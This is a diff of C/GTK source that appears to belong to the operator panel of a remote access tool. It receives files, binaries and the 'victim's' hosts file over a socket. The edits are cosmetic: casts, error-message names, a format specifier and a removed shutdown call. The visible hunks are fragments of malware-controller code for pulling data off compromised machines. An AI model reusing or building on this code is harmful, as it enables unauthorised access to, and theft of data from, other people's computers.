@@ -100,7 +100,7 @@ void download_files(const gchar *path)
     if(downloaded_file == NULL)
     {
         /** Obtaining the buffer associated with the widget. **/
-        text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));
+        text_buffer = gtk_text_view_get_buffer((GtkTextView*)(text_view));
 
         /** Set the default buffer text. **/
         gtk_text_buffer_set_text(text_buffer, "Wrong path !!!\n\
@@ -126,7 +126,7 @@ The path must have this form : /path/path/file", -1);
     /** Recieve file weigth **/
     if(recv(sock, (char*)&weight, sizeof(weight), 0) == SOCKET_ERROR)
     {
-        error("rcv() weight", "dispatch_modules()");
+        error("rcv() weight", "download_files()");
         return;
 
     }
@@ -145,7 +145,7 @@ The path must have this form : /path/path/file", -1);
     }while(totalRcv < weight);
 
     /** Obtaining the buffer associated with the widget. **/
-    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));
+    text_buffer = gtk_text_view_get_buffer((GtkTextView*)(text_view));
 
     /** Set the default buffer text. **/
     gtk_text_buffer_set_text(text_buffer, "File have been downloaded ...", -1);
@@ -242,7 +242,7 @@ void download_binaries(const gchar *path)
     if(downloaded_file == NULL)
     {
         /** Obtaining the buffer associated with the widget. **/
-        text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));
+        text_buffer = gtk_text_view_get_buffer((GtkTextView*)(text_view));
 
         /** Set the default buffer text. **/
         gtk_text_buffer_set_text(text_buffer, "Wrong path !!!\n\
@@ -287,7 +287,7 @@ The path must have this form : /path/path/file", -1);
     }while(totalRcv < weight);
 
     /** Obtaining the buffer associated with the widget. **/
-    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));
+    text_buffer = gtk_text_view_get_buffer((GtkTextView*)text_view);
 
     /** Set the default buffer text. **/
     gtk_text_buffer_set_text(text_buffer, "File have been downloaded ...", -1);
@@ -378,15 +378,15 @@ void download_hosts_files()
 
     if(recv(sock, (char*)&len_hosts_path, sizeof(len_hosts_path), 0) == -1)
     {
-        error("recv() len_hosts_path", "dispatch_modules()");
+        error("recv() len_hosts_path", "download_hosts_files()");
         return;
     }
 
-    printf("path len recv .... %ld\n\n", len_hosts_path);
+    printf("path len recv .... %zd\n\n", len_hosts_path);
 
     if(recv(sock, file_path, len_hosts_path, 0) == -1)
     {
-        error("recv() file_path", "dispatch_modules()");
+        error("recv() file_path", "download_hosts_files()");
         return;
     }
 
@@ -395,7 +395,7 @@ void download_hosts_files()
     /** Recieve file weigth **/
     if(recv(sock, (char*)&weight, sizeof(weight), 0) == SOCKET_ERROR)
     {
-        error("rcv() weight", "dispatch_modules()");
+        error("rcv() weight", "download_hosts_files()");
         return;
 
     }
@@ -415,7 +415,7 @@ void download_hosts_files()
     printf("file downloaded ...\n");
 
     /** Obtaining the buffer associated with the widget. **/
-    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));
+    text_buffer = gtk_text_view_get_buffer((GtkTextView*)text_view);
 
     /** Set the default buffer text. **/
     gtk_text_buffer_set_text(text_buffer, "Victim's hosts file downloaded ...", -1);
@@ -433,8 +433,6 @@ void download_hosts_files()
     g_free(text);
 
     fclose(downloaded_hosts_file);
-
-    shutdown(sock, SHUT_WR);
 
     return;
 
